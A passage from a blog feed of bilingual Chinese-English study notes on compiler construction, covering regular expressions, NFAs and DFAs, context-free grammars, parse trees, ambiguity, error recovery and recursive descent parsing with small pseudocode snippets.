A + B$</p><p>Option: $ A? A + $</p><p>Range: $ 'a' + 'b' + ... + 'z' $</p><p>Exclude range: $ complement of [a-z] $</p><p>具体步骤：</p><blockquote><ol type="1"><li>Write a rexp for lexemes of each token class:</li></ol><p>​ Number = digit+</p><p>​ Keyword = 'if' + 'else' + ...</p><p>​ ...</p><ol start="2" type="1"><li>Contruct R, matching all lexemes for all tokens</li></ol><p>​ R = keyword + idenfier + Number ... = R1 + R2 + ... Rn(所有正则取并集)</p><ol start="3" type="1"><li><p>Let input be x1...xn</p><p>For $1 &lt;= i &lt;= n check x1...xi L(R) $</p></li><li><p>if success, then we know that</p></li></ol><p>​ <span class="math inline">\(x1...xi \in L(Rj) \quad for \quad some\quad j\)</span></p><ol start="5" type="1"><li>Remove x1...xi from input and go to (3)</li></ol></blockquote><p><strong>How much input is need ?</strong></p><p>就像人类读取一样，贪婪的，以==和=为例，双等号出现的时候使用两个等号作为一个匹配整体</p><p><span class="math inline">\(x_1...xi \in L(R)\)</span></p><p><span class="math inline">\(x_1...xj \in L(R)\)</span></p><p><span class="math inline">\(i != j\)</span></p><p>select which t = max(i, j)</p><p><strong>Which token is used ?</strong></p><p><span class="math inline">\(x_1...xi \in L(R_i)\)</span></p><p><span class="math inline">\(x_1...xi \in L(R_j)\)</span></p><p>可以按照优先级，哪个最先出现使用哪个</p><p><strong>what if no rule matches ?</strong></p><p>Error = [all strings not in the lexical specification] as last inpriority</p><p>如果所有的token class都不满足，最后由Error兜底</p><h3 id="conclusion-1">Conclusion</h3><ul><li>Regular expressions are a concise notation for strings patterns</li><li>Use in lexical analysis requires small extensions<ul><li>To resolve ambiguities [matches as long as possible]</li><li>To handle errors [highest priority match]</li></ul></li><li>Good algorithm known<ul><li>Require only single pass over the input(仅仅一次遍历就可以确定每个词素的所属token class)</li><li>Few operations per character (table lookup)</li></ul></li></ul><h2 id="finite-automata">Finite automata</h2><p>Rexp = specifications (正则表达式作为词法分析的规范语言)</p><p>A finite automation consists of of</p><ul><li><p>An input alphabet <spanclass="math inline">\(\Sigma\)</span></p></li><li><p>A set of states S</p></li><li><p>A start state n</p></li><li><p>A set of accepting states F 包含于S</p></li><li><p>A set of transitions state -&gt; (some input) state</p></li><li><p>Transition (状态转移)</p></li></ul><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702223309277.png" alt="image-20230702223309277" style="zoom:50%;" /></p><ul><li><p>Is read(读作): In State s1 on input a goto state s2(在状态s1输入字符a将会进入s2状态)</p></li><li><p>if end of input and in accepting state =&gt; accept</p></li><li><p>Otherwise =&gt; reject</p><ul><li><p>在非接受态输入终止了</p></li><li><p>在某一个状态无法进行状态转移</p></li></ul></li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230630233026614.png"alt="image-20230630233026614" /><figcaption aria-hidden="true">image-20230630233026614</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230630233102794.png"alt="image-20230630233102794" /><figcaption aria-hidden="true">image-20230630233102794</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230630233131470.png"alt="image-20230630233131470" /><figcaption aria-hidden="true">image-20230630233131470</figcaption></figure><blockquote><p>For some reason we're about to read x2 when we make an epsilon movethe machine change state, but the input pointer stays in exactly thesame place. So the new configuration of the machine would be that we'rein state b. But our input pointer is still waiting to read x2. So youcan think of epsilon move is a kind of free move for the machine. It canmove to a different state without consuming any input.</p><p>Just to be clear here, the machne does not have to make the epsilonmove. It's a choice. So we can decide whether to make the epsilon moveor not. Now, epsilon move was the first time we're mentioned thepossibility that a finite automaton might have a choice in what moves itmakes</p></blockquote><p>上面的叫做有选择的自动机</p><p>有选择的自动机(NFA)和没有选择的自动机(DFA)</p><p>确定性自动机：</p><ul><li><p>不存在选择，如epsilon move(因为epsilonmove实际上本身就是一种选择)</p></li><li><p>one transition per input per state</p></li><li><p>A DFA takes only one path through the state graph:</p></li></ul><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702223139657.png" alt="image-20230702223139657" style="zoom:50%;" /></p><p>NFA:</p><ul><li>Can have multiple transitions for one input in a given state</li><li>Can have <span class="math inline">\(\epsilon-moves\)</span></li><li>An NFA can choose:</li></ul><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702223124224.png" alt="image-20230702223124224" style="zoom:50%;" /></p><p>NFA只要有一条path可以到达acceptstate，那么就说这个input属于这个nfa所代表的语言</p><p><strong>Conclusion</strong></p><ul><li>NFAs and DFAs recognize the same setg of language: regularlanguages</li><li>DFAs are faster to execute: there are no choices to consider</li><li>BFAs are , in general, smaller</li></ul><blockquote><p>epsilon move</p></blockquote><h2 id="rexp-2-nfa">Rexp 2 NFA</h2><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">Lexical specification =&gt; Regular expression =&gt; NFA =&gt; DFA =&gt; <span class="hljs-keyword">Table</span>-driven implementation of DFA<br></code></pre></td></tr></table></figure><p>For each kind of rexp, define an equalvalent NFA: NFA for rexp M</p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221029097.png" alt="image-20230702221029097" style="zoom:50%;" /></p><p>For <span class="math inline">\(\epsilon\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221052123.png" alt="image-20230702221052123" style="zoom:50%;" /></p><p>For <span class="math inline">\(a\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221104220.png" alt="image-20230702221104220" style="zoom:50%;" /></p><p>如何联合？</p><p>we add an epsilon transition to the start state of B. What that saysis that first few recognize some portion of the input that belongs tothe language of a(我们已经识别了前面一个正则表达式，希望不消耗掉任何一个字符跳转到另一个正则表达式).And when we get to what we've been the final state of a, we can jump tothe start state of b without consuming any input and try to read therest of the string as part of the string in the language of B.</p><p>For <span class="math inline">\(AB\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221203335.png" alt="image-20230702221203335" style="zoom:50%;" /></p><p>For <span class="math inline">\(A+B\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221219541.png" alt="image-20230702221219541" style="zoom:50%;" /></p><p>For <span class="math inline">\(A^*\)</span></p><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702221643107.png" alt="image-20230702221643107" style="zoom:50%;" /></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702161855178.png"alt="image-20230702161855178" /><figcaption aria-hidden="true">image-20230702161855178</figcaption></figure><h2 id="nfa-2-dfa">NFA 2 DFA</h2><p><strong><spanclass="math inline">\(\epsilon-closure\)</span></strong></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702231414583.png"alt="image-20230702231414583" /><figcaption aria-hidden="true">image-20230702231414583</figcaption></figure><p>An NFA may be in many states at any time (NFA在同一刻可能有多个状态，比如下面的起始点有ABCDHI)</p><p>How many different states ?</p><p>NFA有N个不同的状态，子集种类最大有<spanclass="math inline">\(2^N\)</span>（包含空集） <spanclass="math display">\[N \quad states \\|S| \le N \\2 ^{N} - 1 \quad non-empty \quad subsets\]</span></p><p>$$ NFA: \ states: S \ start: s S \ final: F S \ a(X) = {y | x X_n xy}</p><p>\ \ \ \</p><p>DFA: \ states: subsets of S \ start: -closure(s) \ final: {X | X F }\ X Y if Y = -closure(a(X)) $$</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">NFA:</span><br><span class="hljs-symbol">states:</span> S<br><span class="hljs-symbol">start:</span> s <span class="hljs-keyword">in</span> S<br><span class="hljs-symbol">final:</span> F 包含于S<br>a(<span class="hljs-built_in">X</span>) = &#123;<span class="hljs-built_in">y</span> | <span class="hljs-built_in">x</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">X</span> <span class="hljs-built_in">x</span> -&gt;(a) <span class="hljs-built_in">y</span>&#125;<br><br><br></code></pre></td></tr></table></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702225328912.png"alt="image-20230702225328912" /><figcaption aria-hidden="true">image-20230702225328912</figcaption></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702225314437.png"alt="image-20230702225314437" /><figcaption aria-hidden="true">image-20230702225314437</figcaption></figure><p>DFA can be impl by a 2D table T</p><ul><li>One dimension is states</li><li>Other dimension is input symbol</li></ul><p>For every transition $ s_i s_k $ define <spanclass="math inline">\(T[i, a] = k\)</span></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf">i = <span class="hljs-number">0</span> 控制字符的指针<br><span class="hljs-keyword">state</span> = <span class="hljs-number">0</span> 控制状态<br>while (input[i]) &#123;<br><span class="hljs-keyword">state</span> = A[<span class="hljs-keyword">state</span>, input[i++]];<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/Users/bytedance/Library/Application Support/typora-user-images/image-20230702232859459.png" alt="image-20230702232859459" style="zoom:50%;" /></p><table><thead><tr class="header"><th></th><th>0</th><th>1</th></tr></thead><tbody><tr class="odd"><td>S</td><td>T</td><td>U</td></tr><tr class="even"><td>T</td><td>T</td><td>U</td></tr><tr class="odd"><td>U</td><td>T</td><td>U</td></tr></tbody></table><p>如果觉得states太多，表太大，可以考虑共享内存和链表的方式存储表结构，对于N个states的NFA来说最多需要<spanclass="math inline">\(2^N - 1\)</span> 对应的DFA states</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230702232401012.png"alt="image-20230702232401012" /><figcaption aria-hidden="true">image-20230702232401012</figcaption></figure><p>这个时候states(行数)为NFA的states数量</p><p><strong>Conclusion</strong></p><ul><li>NFA -&gt; DFA conversion is key</li><li>Tools trade between speed and space<ul><li>DFAs: faster, less compact</li><li>NFAs: slower, concise</li></ul></li></ul><h2 id="conclusion-2">Conclusion</h2><p>怎么实现</p><p>自动机的应用（本质上是保存状态，进行状态转移）</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 3 Parsing Analysis 1 (Introduction &amp; LL Analysis)</title>
    <link href="/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%89/"/>
    <url>/emocoder/2023/06/10/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>Regular languages</p><ul><li>The weakest formal languages widely used</li><li>Many applications</li></ul><p>正则表达式的缺陷：</p><ul><li></li></ul><p>Parser：</p><ul><li>Input: sequence of tokens from lexer</li><li>Output: parse tree pf the program</li></ul><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs hsp">Cool:<br><span class="hljs-keyword">if</span> x = y then <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">2</span> fi<br>Parser <span class="hljs-keyword">input</span>:<br><span class="hljs-keyword">IF</span> ID = ID THEN <span class="hljs-keyword">INT</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-keyword">INT</span> FI<br>Parser output:<br> <span class="hljs-keyword">IF</span>-THEN-<span class="hljs-keyword">ELSE</span><br>=      <span class="hljs-keyword">INT</span>      <span class="hljs-keyword">INT</span><br>ID ID    <br></code></pre></td></tr></table></figure><table><thead><tr class="header"><th>Phase</th><th>Intput</th><th>Output</th></tr></thead><tbody><tr class="odd"><td>Lexer</td><td>String of characters</td><td>String of tokens</td></tr><tr class="even"><td>Parser</td><td>String of tokens</td><td>Parse tree</td></tr></tbody></table><blockquote><p>上面两步有的编译器是分开做的，有的编译器是放在一起做的</p></blockquote><h2 id="上下无关文法">上下无关文法</h2><p>由词法分析器得到的tokens并不全是有用的，比如标点符号，所以编译器必须识别哪些是有效token，哪些是无效的，我们需要一种描述规则来描述何为有效token，以及一种识别有效token的方法</p><p>程序语言都是有着nested(递归)的结构，如：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">EXPR = <span class="hljs-keyword">if</span> <span class="hljs-keyword">EXPR</span> then <span class="hljs-keyword">EXPR</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">EXPR</span> fi<br><span class="hljs-keyword">while</span> <span class="hljs-keyword">EXPR</span> loop <span class="hljs-keyword">EXPR</span> pool<br></code></pre></td></tr></table></figure><p><strong>上下无关文法据说一种描述这种递归结构的naturalnotation</strong></p><p>CFG 由下面几部分构成：</p><ul><li>a set of terminals: <span class="math inline">\(T\)</span></li><li>a set of nn-terminals: <span class="math inline">\(N\)</span></li><li>a start symbol: <span class="math inline">\(S (S \inN)\)</span></li><li>a set of productions:$ X -&gt; Y_1, ... Y_N (X N, Y_i N T {})$</li></ul><ol type="1"><li>Begin with a string with only the start symbol S</li><li>Replace any non-terminal X in the string by the right-hand side ofsome production</li><li>Repeat (2) until there are non-terminals</li></ol><p>let G be a contexto-free grammar with start symbol S. Then thelanguage L(G) of is: <span class="math display">\[\{ a_1, ... a_n \quad | \quad \forall_i \quad a_i \in T \and S\mathop{\rightarrow}^* a_1, ..., a_n \}\]</span></p><ul><li>Terminals are so-called because there are no-reulses for replacingthem 终结符是不变的</li><li>Once generated, terminals are permanent，终结符是不变的</li><li>Terminals ought to be tokens of the language(终结符一般是语言的token，比如关键字，标识符)</li></ul><p>🌰：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xquery">E -&gt; E + E<br> | E * E<br> | (E)<br> |<span class="hljs-built_in"> id</span><br> <br>对应的语言：<span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span> +<span class="hljs-built_in"> id</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">id</span> +<span class="hljs-built_in"> id</span> *<span class="hljs-built_in"> id</span><br><span class="hljs-built_in">(id</span> +<span class="hljs-built_in"> id</span>) *<span class="hljs-built_in"> id</span><br></code></pre></td></tr></table></figure><p>整个CFG是一个很大的步骤，需要：</p><ul><li>Membership in a alnguage is yes or no, also parse tree of theinput</li><li>Must handle errors gracefully</li><li>Need an implementation of CFG's (eg: bison)</li></ul><h2 id="derivations推导">Derivations(推导)</h2><p>A derivations s a <strong>sequence</strong> f production: <spanclass="math display">\[S -&gt; .. -&gt; ,,, -&gt; ... -&gt; ..\]</span> 推导过程可以以树的形式画出来：</p><ul><li>start symbol is the tree's root</li><li>For a production <spanclass="math inline">\(X-&gt;Y_1Y_2..Y_n\)</span> add children <spanclass="math inline">\(Y_1Y_2...Y_n\)</span> o node X</li></ul><p>考虑下面语法： <span class="math display">\[E → E + E |  E * E | (E) | id\]</span> 以及字符串：id * id + id</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230617134603437.png"alt="image-20230617134603437" /><figcaption aria-hidden="true">image-20230617134603437</figcaption></figure><p>A parse tree has</p><ul><li>Terminals at the leaves</li><li>Non-terminals at the interior nodes</li></ul><blockquote><p>对叶子节点的in-order遍历就是原始输出，parsetree表示了token之间的各种关系</p><p>如下：</p><p>叶子节点从左到右：就是原始输入：id * id + id</p><p>中间节点和左右兄弟节点的关系也很明确，*的左右就是id</p></blockquote><p>上述推导式的产生是left-most，即在每一步优先推导最左边的符号（即推导方向是自左向右），但是这样可能会出现没有结束条件而一直无限推导下去。还有一种与之类似的right-most推导</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">E<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E + E</span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E * E + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">E * <span class="hljs-built_in">id</span> + <span class="hljs-built_in">id</span></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash"><span class="hljs-built_in">id</span> * <span class="hljs-built_in">id</span> + <span class="hljs-built_in">id</span></span><br></code></pre></td></tr></table></figure><blockquote><p>Note that r-most and l-most derivations have the same parse tree</p><p>A derivations defines a parse tree, but one parse tree may have manyderivations</p><p>一个Parse tree可能有很多种推导方式可以得到，但是最左推导和最右推导是最重要的两种方式</p></blockquote><p><strong>Conclusion</strong>:</p><ul><li>不仅对某个字符串是否属于L(G)(语法G所产生的语言)感兴趣，也需要对应的解析树</li><li>一个推导式定义了一个解析树（或者解析树的一部分），同一个Parse tree可能有很多种推导方式可以得到</li></ul><h2 id="ambiguity语法的二义性">Ambiguity(语法的二义性)</h2><h3 id="解析优先级">解析优先级</h3><p>Grammar: E -&gt; E + E | E * E | (E) | id</p><p>String stream: id * id + id</p><p>不同的推导得到不同的parse tree：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span> <span class="hljs-operator">*</span> <span class="hljs-built_in">E</span> <span class="hljs-variable">id</span><br><span class="hljs-variable">id</span>  <span class="hljs-variable">id</span> <br><br><span class="hljs-built_in">E</span><br><span class="hljs-built_in">E</span>  <span class="hljs-operator">*</span>  <span class="hljs-built_in">E</span><br>  <span class="hljs-variable">id</span>  <span class="hljs-built_in">E</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">E</span><br> <span class="hljs-variable">id</span>   <span class="hljs-variable">id</span> <br></code></pre></td></tr></table></figure><blockquote><p>A grammar is ambiguous if it has more than one parse tree for somestring, 换句话说，对于某些字符串，可以由超过一种的做作或最右推导方式</p></blockquote><p><strong>How to handle ambiguous</strong></p><p>Method 1:</p><p>重写语法：其实本质上是强制了解析时候的优先级</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">E -&gt; <span class="hljs-string">E&#x27; + E/E&#x27;</span><br><span class="hljs-string">E&#x27; -&gt; id * E&#x27;</span> | id | (E) * <span class="hljs-string">E&#x27;| (E) </span><br></code></pre></td></tr></table></figure><p>Method 2：</p><p>不重写，但是在解析的时候，使用优先级或者判断哪个是最优的</p><h3 id="结合性">结合性</h3><h2 id="parsing-error-handleparser过程的错误处理">Parsing ErrorHandle(parser过程的错误处理)</h2><table><thead><tr class="header"><th>Error kind</th><th>Example</th><th>Detected by</th></tr></thead><tbody><tr class="odd"><td>Lexical</td><td>使用了未知符号，比如else写成了eles</td><td>Lexer</td></tr><tr class="even"><td>Syntax</td><td>编写的程序存在结构错误，比如while后面应该有一对{},但是只写了一个{</td><td>parser</td></tr><tr class="odd"><td>Semantic</td><td>int x; x(3);声明x为普通变量，但是却把x当成函数使用</td><td>Type Checker</td></tr><tr class="even"><td>Correctness</td><td>自己的代码虽然通过了编译器，但是运行结果不符合预期</td><td>User/Tester，一般需要自己debug</td></tr></tbody></table><p>Error handler should:</p><ul><li>Report errors accurately and clearly</li><li>Recover from an error quickly</li><li>Not slow down compilation of valid code</li></ul><p>常见的三种不同错误处理模式：</p><ul><li>Panic Mode (使用特殊的终止符(error)吃掉错误，继续执行)<ul><li>When an error is detected<ul><li>Discard tokens until one with clear role is found</li><li>Continue from here</li></ul></li></ul></li></ul><p>​ 🌰：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(1 + + 2) + 2<br><span class="hljs-keyword">skip </span>ahead to next interger and then continue<br></code></pre></td></tr></table></figure><p>Bison: use the special terminal error to descide how mucg input toskip</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">E -&gt; int | <span class="hljs-type">E</span> + E | <span class="hljs-type">(E</span>) | <span class="hljs-type">error</span> int | <span class="hljs-type">(error</span>)<br></code></pre></td></tr></table></figure><ul><li><p>Error productions (添加可能的错误的推导式): specify known commonmistakes in the grammar</p><p>Eg: write 5 x instead of 5 * x</p><p>Add production E -&gt; .... | E E</p><p>Disadvantage: complicates the grammar</p></li><li><p>Automatic local or global correction</p><ul><li>Find a correct "nearby" program<ul><li>try token insertions and deletions (编辑距离)</li><li>exhaustive search</li></ul></li><li>Disadvantages:<ul><li>hard to impl</li><li>slows down parsing of correct programs</li><li>"nearby" is not necessarily "the intended" program</li></ul></li></ul></li></ul><p>Past:</p><ul><li>Slow recompilation cycle (even once a day)</li><li>rind as many errors in one cycle as possible</li></ul><p>Present:</p><ul><li>Quick recompilation cycle</li><li>users tend to correct one error/cycle</li><li>Complex error recovery is less compelling</li></ul><h2 id="another-clean-parse-tree-form-ast">Another Clean Parse Tree Form—— AST</h2><p>Parser跟踪(trace)一个token序列的推导过程，并由此产生Parse tree</p><p>🌰：</p><p>Grammar: E -&gt; int | (E) | E + E</p><p>After lexical analysis: [Int(2), '+', '(', Int(1), '+', 'Int(5),')']</p><p>Parse Tree:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">E<br>E + E<br><span class="hljs-built_in">int</span>(<span class="hljs-number">2</span>) (E)<br>E + E<br><span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">int</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>AST：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[Plus, leftO, rightO]</span><br><span class="hljs-built_in">Int</span>(<span class="hljs-number">2</span>)  <span class="hljs-selector-attr">[Plus, leftO, rightO]</span><br><span class="hljs-built_in">Int</span>(<span class="hljs-number">1</span>) <span class="hljs-built_in">Int</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>被称之为AST，因为它从具体语法中抽象出来，煎炒了具体语法的细节；而ParseTree展示了具体的推导规则和相关结构，对于编译器来水说，有很多不必要的内容</p><h3 id="递归下降解析">递归下降解析</h3><p>解析树一般按照如下方式构建：</p><ul><li>自上至下</li><li>从左到右</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span><br><span class="hljs-built_in">t2</span>. <span class="hljs-number">3</span>.  <span class="hljs-built_in">t9</span><br>   <span class="hljs-number">4</span>. <span class="hljs-number">7</span> <br>  <span class="hljs-built_in">t5</span>. <span class="hljs-built_in">t6</span>.  <span class="hljs-built_in">t8</span><br></code></pre></td></tr></table></figure><p>Tokens: [t2, t5, t6, t8, t9]</p><p>看一个详细的递归下降解析的🌰：</p><p>考虑语法Grammar:</p><p>E -&gt; T | T | T + E</p><p>T -&gt; int | int * T | (E)</p><p>输入：<span class="math inline">\((int_5)\)</span></p><p>步骤：</p><p>从起始菲终结符开始，依次尝试关于E的推导式</p><figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ocaml"><span class="hljs-type">E</span> -&gt; <span class="hljs-type">T</span> -&gt; <span class="hljs-built_in">int</span> (mismatch: <span class="hljs-built_in">int</span> does not <span class="hljs-keyword">match</span> (, backtrack) =&gt;<br> <span class="hljs-type">T</span> -&gt; [<span class="hljs-built_in">int</span> * <span class="hljs-type">T</span>] (mismatch: <span class="hljs-built_in">int</span> does not <span class="hljs-keyword">match</span> (, backtrack) =&gt;<br> <span class="hljs-type">T</span> -&gt; ( <span class="hljs-type">E</span> ) (<span class="hljs-keyword">match</span>: 继续下一个输入字符<span class="hljs-built_in">int</span> =&gt;<br> <span class="hljs-type">T</span> -&gt; ( <span class="hljs-type">E</span> -&gt; <span class="hljs-built_in">int</span> ) (<span class="hljs-keyword">match</span>: 继续下一个输入字符) =&gt;<br></code></pre></td></tr></table></figure><p>递归下降解析算法的一般定义如下：</p><p>首先定义几个关于是否符合某个匹配的函数：</p><ul><li><p>是否为终结符：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">bool</span> <span class="hljs-title function_">term</span>(<span class="hljs-params">TOKEN</span> <span class="hljs-params">tok</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-operator">*</span><span class="hljs-variable">next</span><span class="hljs-operator">+</span><span class="hljs-operator">+</span> <span class="hljs-operator">==</span> <span class="hljs-variable">tok</span>&#125;<br></code></pre></td></tr></table></figure></li><li><p>是否为lfs为S第n个推导式：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">Sn</span>()</span> &#123;&#125;<br></code></pre></td></tr></table></figure></li><li><p>是否为lfs为S的推导式</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">S</span>()</span> &#123;&#125;<br></code></pre></td></tr></table></figure></li></ul><p>🌰：</p><ul><li><p>E -&gt; T: bool E1() { return T() }</p></li><li><p>E -&gt; T + E: bool E2() { return T() &amp;&amp; term(PLUS)&amp;&amp; E() }</p></li><li><p>对于整个E来说：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q">bool E() &#123;<br>TOKEN *<span class="hljs-built_in">save</span> = <span class="hljs-built_in">next</span>;<br>return (<span class="hljs-built_in">next</span> = <span class="hljs-built_in">save</span>, E1()) || (<span class="hljs-built_in">next</span> = <span class="hljs-built_in">save</span>, E2());<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>同样的对于上面的非终结符T，有：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T1</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(INT);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T2</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(INT) &amp;&amp; term(TIMES) &amp;&amp; T();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T3</span>()</span> &#123;<br><span class="hljs-keyword">return</span> term(OPEN) &amp;&amp; E() &amp;&amp; term(CLOSE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-built_in">bool</span> <span class="hljs-title">T</span>()</span> &#123;<br> TOKEN *save = next;<br><span class="hljs-keyword">return</span> (next = save, T1()) || (next = save, T2() || (next = save, T3()));<br>&#125;<br></code></pre></td></tr></table></figure><p>整个步骤：</p><ul><li>初始化next为第一个token</li><li>调用E()</li></ul><p><strong>Conslusion</strong>:</p><p>递归下降过程中，不断地递归合回溯所产生的函数调用结构其实就是解析树的体现，所以在递归下降的同时构建AST。</p><h3 id="上面的递归下降算法的限制">上面的递归下降算法的限制：</h3><p>对于E -&gt; T | T | T +E，一旦递归到了T，并且从继续向下递归，一旦不符合了，只会在当前层级尝试其他的推导式，但是不会基于T的同层级去尝试T和T+E</p><p>所以上面的普通的递归下降只适用于一部分语法，对于有些不符合的语法，可以采用左因子(left-factor)进行改写：</p><h3 id="左递归">左递归</h3><p>考虑产生式：S -&gt; S a</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span 